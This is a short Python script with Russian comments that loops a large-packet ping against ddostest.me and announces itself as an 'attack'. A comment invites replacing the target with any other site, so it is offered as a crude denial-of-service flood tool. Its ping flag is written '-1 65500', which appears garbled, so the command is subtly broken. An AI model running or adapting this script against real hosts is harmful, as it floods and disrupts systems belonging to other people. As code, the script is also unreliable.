import os

# Команда, которую нужно выполнять у нас это пинг
command = "ping -1 65500 ddostest.me" # меняем сайт на любой другой

print("Начинаю атаку. Чтобы остановить, нажмите Ctrl+C")

try:
    while True:
        os.system(command)
except KeyboardInterrupt:
    print("\nАтака остановлена пользователем.Хорошего дня сер Карданвал")
